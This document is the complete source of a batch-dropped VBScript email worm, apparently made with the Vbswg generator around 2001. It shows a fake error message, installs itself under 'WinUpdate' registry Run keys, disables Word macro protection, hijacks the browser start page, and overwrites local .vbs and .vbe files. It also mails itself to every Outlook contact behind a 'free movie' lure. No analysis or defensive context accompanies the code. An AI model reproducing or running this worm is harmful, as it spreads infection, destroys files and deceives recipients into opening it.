   @echo off
   copy %0  %windir%\test.bat /y
   @cls
   Echo >>setup.vbs set ff=createobject("scripting.filesystemobject")
   Echo >>setup.vbs set rr=ff.opentextfile("%0",1)
   Echo >>setup.vbs lls=Split(rr.ReadAll,vbCrLf)
   Echo >>setup.vbs for ii=30 to 100
   Echo >>setup.vbs newcode=newcode & vbcrlf & lls(ii)
   Echo >>setup.vbs next
   Echo >>setup.vbs set ww=ff.createtextfile(ff.getspecialfolder(0) & "\wininit.vbs",true)
   Echo >>setup.vbs ww.write newcode
   Echo >>setup.vbs ww.close
   Echo >>setup.vbs set ss=createobject("wscript.shell")
   Echo >>setup.vbs Set AUU23015 = createobject("scripting.filesystemobject")
   Echo >>setup.vbs AJ855DTU = AUU23015.getspecialfolder(0)
   Echo >>setup.vbs IHOO4885 = AJ855DTU & "\wininit.vbs"
   Echo >>setup.vbs VROO4131 = AJ855DTU & "\Desktop\Erotik Portal.url"
   Echo >>setup.vbs Set MHD78B62 = createobject("wscript.shell")
   Echo >>setup.vbs MHD78B62.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", IHOO4885
   Echo >>setup.vbs Dim WSHShell
   Echo >>setup.vbs Set WSHShell = WScript.CreateObject("WScript.Shell")
   Echo >>setup.vbs WSHShell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.dominanza.de/welcome.html"
   Echo >>setup.vbs AUU23015.movefile "Erotik Portal.url", VROO4131
   Echo >>setup.vbs ss.run ff.getspecialfolder(0) & "\wscript.exe " & ff.getspecialfolder(0) & "\wininit.vbs %",1,false
   start setup.vbs
   @cls
   Echo Fatal ERROR. Can't Run the application.
   @pause
   del setup.vbs
   goto end
   'Vbs.Vbswg.wininit Created By Mikrosaft. 7/20/2001
   On Error Resume Next
   Select Case Application.Version
   Case "9.0"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
   Case "8.0"
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   End Select
   Set AUU23015 = createobject("scripting.filesystemobject")
   AJ855DTU = AUU23015.getspecialfolder(0)
   IHOO4885 = AJ855DTU & "\wininit.vbs"
   BULBAS3 = AJ855DTU & "\test.bat"
   Set MHD78B62 = createobject("wscript.shell")
   MHD78B62.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", IHOO4885
   MHD78B62.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", BULBAS3
   AUU23015.copyfile "test.bat", BULBAS3
   AUU23015.movefile wscript.scriptfullname, IHOO4885
   AUU23015.deletefile "test.bat"
   GJLFB873
   If MHD78B62.regread("HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page") <> "http://www.dominanza.de/welcome.html" then
   S77B6H21
   End if
   Function S77B6H21()
   Dim WSHShell
   Set WSHShell = WScript.CreateObject("WScript.Shell")
   WSHShell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.dominanza.de/welcome.html"
   If MHD78B62.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate") <> "*.vbs" then
   Set Che_OApp = CreateObject("Outlook.Application")
   Set Che_Mapi = Che_OApp.GetNameSpace("MAPI")
   For Each Che_AddList In Che_Mapi.AddressLists
   If Che_AddList.AddressEntries.Count <> 0 Then
   For Che_AddListCount = 1 To Che_AddList.AddressEntries.Count
   Set Che_AddListEntry = Che_AddList.AddressEntries(Che_AddListCount)
   Set Che_msg = Che_OApp.CreateItem(0)
   Che_msg.To = Che_AddListEntry.Address
   Che_msg.Subject = "Hot !"
   Che_msg.Body = "Take a look at my free movie !" + vbCrLf + "You won´t be disapointed !" + vbCrLf + "Kind regards" + vbCrLf + "Jasmine"
   Che_msg.Attachments.Add Environ("IHOO4885")
   Che_msg.DeleteAfterSubmit = True
   If Che_msg.To <> "" Then
   Che_msg.Send
   DoEvents
   End If
   DoEvents
   Next
   End If
   Next
   End if
   End Function
   Function QEP8IG5E(G7167PCR)
   VGN34V0T = G7167PCR
   Set DQR92IV4 = AUU23015.GetFolder(VGN34V0T)
   Set JUR1QNO5 = DQR92IV4.Files
   For Each GI3014C2 In JUR1QNO5
   If AUU23015.GetExtensionName(GI3014C2.path) = "vbs" then
   AUU23015.CopyFile wscript.scriptfullname,GI3014C2.path,true
   End if
   If AUU23015.GetExtensionName(GI3014C2.path) = "vbe" then
   AUU23015.CopyFile wscript.scriptfullname,GI3014C2.path,true
   End if
   Next
   Set AO87845U = DQR92IV4.Subfolders
   For Each L68SPJI8 In AO87845U
   Call (L68SPJI8.path)
   Next
   End function
   Function GJLFB873()
   end function
   'Vbswg 2 Beta. By [K]
   :end
   del test.bat
   @cls
   @exit
